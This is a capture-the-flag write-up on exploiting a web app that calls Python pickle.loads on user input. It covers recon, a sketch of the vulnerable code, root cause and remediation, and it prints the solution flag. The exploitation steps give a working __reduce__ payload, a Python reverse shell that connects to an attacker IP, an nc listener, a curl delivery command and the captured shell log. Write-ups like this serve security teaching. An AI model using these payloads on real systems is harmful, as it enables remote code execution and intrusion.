# Insecure Deserialization — CTF Write-up

**Challenge:** Insecure Deserialization
**Category:** Web Security
**Difficulty:** Medium
**Points:** 200
**Target:** `ctf-akshay-insecure-deserialization-fea10635.challenges.pentestgarage.com`
**Flag:** `ctf{pickeled_r!ck_!s_th3_b3st_r!ck}`

---

## Summary

The target application exposes a `Serialize` / `Deserialize` interface that
directly calls Python's `pickle.loads()` on user-controlled, base64-encoded
input with no validation. Since `pickle` can reconstruct arbitrary Python
objects — including calling arbitrary functions via the `__reduce__`
protocol — this allowed full remote code execution (RCE), which was used to
pop a reverse shell and read the flag.

**Vulnerability class:** CWE-502 — Deserialization of Untrusted Data

---

## Recon

The app's home page offered two actions on a single `data` textarea:

- `action=serialize`
- `action=deserialize`

Submitting arbitrary text through `serialize` echoed back a base64 blob:

```
POST /
data=hello&action=serialize
```

```
gASVJgAAAAAAAACMA2FwcJSMBERhdGGUk5QpgZR9lIwEdGV4dJSMBWhlbGxvlHNiLg==
```

Decoding and disassembling this with `pickletools` confirmed it was a
Python `pickle` stream (protocol 4), wrapping the input in an application
class:

```python
import pickletools, base64
data = base64.b64decode("gASVJgAAAAAAAACMA2FwcJSMBERhdGGUk5QpgZR9lIwEdGV4dJSMBWhlbGxvlHNiLg==")
pickletools.dis(data)
```

```
    0: \x80 PROTO      4
    2: \x95 FRAME      38
   11: \x8c SHORT_BINUNICODE 'app'
   16: \x94 MEMOIZE    (as 0)
   17: \x8c SHORT_BINUNICODE 'Data'
   23: \x94 MEMOIZE    (as 1)
   24: \x93 STACK_GLOBAL
   25: \x94 MEMOIZE    (as 2)
   26: )    EMPTY_TUPLE
   27: \x81 NEWOBJ
   28: \x94 MEMOIZE    (as 3)
   29: }    EMPTY_DICT
   30: \x94 MEMOIZE    (as 4)
   31: \x8c SHORT_BINUNICODE 'text'
   37: \x94 MEMOIZE    (as 5)
   38: \x8c SHORT_BINUNICODE 'hello'
   45: \x94 MEMOIZE    (as 6)
   46: s    SETITEM
   47: b    BUILD
   48: .    STOP
```

This showed the server-side code was roughly:

```python
import pickle

class Data:
    def __init__(self, text):
        self.text = text

@app.route("/", methods=["POST"])
def index():
    if request.form["action"] == "serialize":
        obj = Data(request.form["data"])
        blob = base64.b64encode(pickle.dumps(obj))
    elif request.form["action"] == "deserialize":
        raw = base64.b64decode(request.form["data"])
        obj = pickle.loads(raw)   # <-- unsafe: attacker-controlled input
        ...
```

Feeding a `serialize`d blob back into `deserialize` round-tripped cleanly,
confirming the endpoint really does call `pickle.loads()` on whatever bytes
are supplied — with no signing, allow-listing, or type restriction.

---

## Exploitation

`pickle` is **not a data format** like JSON — it's a small stack-based
bytecode for reconstructing arbitrary Python objects. Critically, the
`REDUCE` opcode lets a pickled object specify a callable and arguments to
invoke during unpickling. Any class implementing `__reduce__` can hijack
this to run arbitrary code the moment `pickle.loads()` touches it —
regardless of what "real" classes the target application defines.

### Step 1 — Blind RCE / confirm execution

```python
import pickle, base64

class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('id; hostname; whoami',))

payload = pickle.dumps(Exploit(), protocol=0)
print(base64.b64encode(payload).decode())
```

Sending this to `/` with `action=deserialize` returned a `500 Internal
Server Error` rather than the normal page. This was actually a good sign:
`os.system()` returns an integer exit code, so the app's downstream code
(expecting a `Data` object with a `.text` attribute) crashed on
`AttributeError` — meaning our callable *did* execute before the app
choked on the return value.

### Step 2 — Weaponize with a reverse shell

Since output wasn't reflected back on the page, blind RCE was upgraded to
a full interactive shell via an out-of-band reverse connection:

```python
import pickle, base64

LHOST = "10.8.0.118"   # attacker VPN IP (tun0)
LPORT = 4444

cmd = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{LHOST}",{LPORT}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])'''

class Exploit:
    def __reduce__(self):
        import os
        return (os.system, (f"python3 -c '{cmd}' &",))

payload = pickle.dumps(Exploit(), protocol=0)
print(base64.b64encode(payload).decode())
```

### Step 3 — Catch the shell

```bash
# Listener
nc -lvnp 4444
```

```bash
# Delivery
curl -X POST "http://ctf-akshay-insecure-deserialization-fea10635.challenges.pentestgarage.com/" \
  --data-urlencode "data=<base64 payload from Step 2>" \
  --data-urlencode "action=deserialize"
```

Result:

```
listening on [any] 4444 ...
connect to [10.8.0.118] from (UNKNOWN) [172.31.45.248] 25667
/bin/sh: 0: can't access tty; job control turned off
$ ls
app.py
flag.txt
requirements.txt
templates
$ cat flag.txt
ctf{pickeled_r!ck_!s_th3_b3st_r!ck}
```

---

## Root Cause

```python
obj = pickle.loads(raw)
```

The Python documentation explicitly warns against this pattern:

> The pickle module is not secure. Only unpickle data you trust.

`pickle.loads()` was called on data that originated entirely from an
unauthenticated HTTP request, with no cryptographic signing, no
allow-listing of permitted classes, and no sandboxing.

---

## Remediation

- **Never unpickle untrusted input.** Prefer `json` (or another format
  limited to primitive data types) for anything that crosses a trust
  boundary.
- If `pickle` is unavoidable for internal use, restrict what classes can be
  reconstructed by overriding `Unpickler.find_class()` with a strict
  allow-list.
- Sign serialized data (e.g. HMAC) and verify the signature *before*
  deserializing, so tampered payloads are rejected outright.
- Run application processes with least privilege and network egress
  restrictions to limit blast radius if deserialization is ever abused.

---

## Timeline

| Step | Action |
|---|---|
| 1 | Identified `serialize`/`deserialize` actions on `/` |
| 2 | Fingerprinted format as Python `pickle` via `pickletools.dis` |
| 3 | Confirmed round-trip deserialization of attacker-supplied blobs |
| 4 | Built `__reduce__`-based payload calling `os.system` |
| 5 | Observed 500 error indicating blind execution |
| 6 | Weaponized with reverse shell payload |
| 7 | Caught shell, read `flag.txt` |
